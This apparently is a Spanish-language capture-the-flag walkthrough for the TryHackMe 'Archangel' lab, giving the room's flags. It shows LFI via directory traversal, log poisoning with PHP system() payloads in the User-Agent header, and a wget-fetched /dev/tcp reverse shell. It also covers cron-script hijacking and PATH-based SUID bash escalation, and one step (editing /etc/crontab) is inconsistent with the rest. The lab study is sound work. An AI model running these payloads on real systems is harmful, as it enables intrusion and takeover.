@@ -1,0 +1,169 @@
+Tryhackme
+archangel
+
+nmap:
+
+nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn 10.10.54.182 -oN archangel
+
+Resultado:
+
+• 80 http
+• 22 SSH
+
+Fuzzing:
+
+wfuzz -u http://mafialive.thm/fuzz.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+Resultado:
+
+• /test.php
+
+Aquí comenzamos con la Directory Traversal:
+
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/./.././.././.././.././.././../etc/passwd
+
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/./.././.././.././.././.././../var/log/apache2/access.log
+
+Luego, usamos curl:
+
+curl -s -X GET 'http://mafialive.thm' -H 'User-Agent: Hola'
+
+Respuesta:
+
+<h1>UNDER DEVELOPMENT</h1>
+thm{f0und_th3_r1ght_h0st_n4m3}
+
+Este comando realiza una solicitud silenciosa a la URL "http://mafialive.thm" utilizando el método GET y establece el encabezado "User-Agent" como "Hola".
+
+"curl" es una herramienta que se utiliza para hacer solicitudes a sitios web desde la línea de comandos.
+
+"-s" es una opción que indica que la solicitud debe ser silenciosa, es decir, no muestra información adicional en la pantalla mientras se realiza la solicitud.
+
+"-X GET" es otra opción que especifica el tipo de solicitud que se está haciendo, en este caso, una solicitud GET para obtener información de una página web.
+
+"'http://mafialive.thm'" es la URL del sitio web al que se está haciendo la solicitud.
+
+"-H 'User-Agent: Hola'" es otra opción que establece un encabezado HTTP llamado "User-Agent" con el valor "Hola". El encabezado "User-Agent" se utiliza para identificar el tipo de navegador o cliente que realiza la solicitud.
+
+Con esa inyección de código, procedemos a agregar más código PHP:
+
+curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('whoami'); ?>"
+
+Respuesta:
+
+• www-data
+
+Repetimos con diversos comandos:
+
+ls:
+• index.html
+• mrrobot.php
+• robots.txt
+• test.php
+
+Generamos un script en bash para obtener una reverse shell:
+
+nano mario.sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.18.112.21/443 0>&1
+
+Abrimos un servidor Python para compartirlo con la máquina víctima:
+
+python3 -m http.server 80
+
+Desde la máquina víctima, copiamos el archivo "mario.sh":
+
+curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('wget 10.18.112.21:80/mario.sh'); ?>"
+
+Con un "ls" en la máquina víctima, comprobamos que tenemos el script:
+
+curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('ls'); ?>"
+
+Respuesta:
+• index.html
+• mrrobot.php
+• robots.txt
+• test.php
+• mario.sh
+
+Ahora debemos darle permisos a "mario.sh":
+
+curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('chmod 777 mario.sh'); ?>"
+
+Ejecutamos mario.sh:
+
+curl -s -X GET 'http://mafialive.thm' -H "User-Agent: <?php system('./mario.sh'); ?>"
+
+Hacemos el tratamiento de la TTY:
+
+script /dev/null -c bash
+(control z)
+
+stty raw -echo; fg
+reset xterm
+
+export TERM=xterm
+export SHELL=bash
+
+Ya estando dentro, buscando entre los archivos encontramos "usr.txt":
+
+thm{lf1_t0_rc3_1s_tr1cky}
+
+Luego de buscar y no encontrar más que rickrolls, procedemos a buscar desde la raíz para ver qué binarios se ejecutan con privilegios elevados:
+
+find / -perm -4000 2>/dev/null
+
+Respuesta:
+
+• /usr/bin/newgrp
+• /usr/bin/gpasswd
+• /usr/bin/chfn
+• /usr/bin/chsh
+• /usr/bin/passwd
+• /usr/bin/traceroute6.iputils
+• /usr/bin/sudo
+• /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+• /usr/lib/openssh/ssh-keysign
+• /usr/lib/eject/dmcrypt-get-device
+• /bin/umount
+• /bin/su
+• /bin/mount
+• /bin/fusermount
+• /bin/ping
+
+Nada útil.
+
+Procedemos a:
+
+cat /etc/crontab
+
+Encontramos:
+
+*/1 * * * * archangel /opt/helloworld.sh
+
+Se ejecuta un script en bash.
+
+cat /opt/hellowordl.sh
+#!/bin/bash
+echo "hello world" >> /opt/backupfiles/helloworld.txt
+
+Modificamos para obtener el privilegio:
+
+nano /etc/crontab
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.18.112.21/444 0>&1
+
+Con eso pivotamos al usuario archangel utilizando Netcat en el puerto 444. Como archangel, encontramos "user2.txt":
+
+thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
+
+Ahora, para llegar a root, necesitamos encontrar un script que se ejecute como root. Encontramos dentro del binario "backup" donde se ejecuta como root el archivo "cp":
+
+nano cp
+chmod u+s /bin/bash
+
+Ejecutamos y ya somos root. Entramos a la carpeta de root y encontramos la última flag:
+
+root
+thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
